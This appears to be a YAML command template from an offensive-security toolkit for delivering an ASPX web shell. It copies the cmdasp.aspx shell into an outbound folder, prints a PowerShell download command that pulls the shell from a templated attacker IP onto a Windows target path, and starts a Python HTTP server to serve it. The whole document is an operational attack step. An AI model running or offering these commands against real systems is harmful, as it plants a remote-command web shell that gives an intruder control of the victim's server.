---
metadata:
  filename: "deliver-webshell-aspx.yaml"
  tags: ["web", "shell"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; cp -n /usr/share/webshells/aspx/cmdasp.aspx packstation/outbound; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/cmdasp.aspx -Outfile {{ delivery_path_windows }}\cmdasp.aspx'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
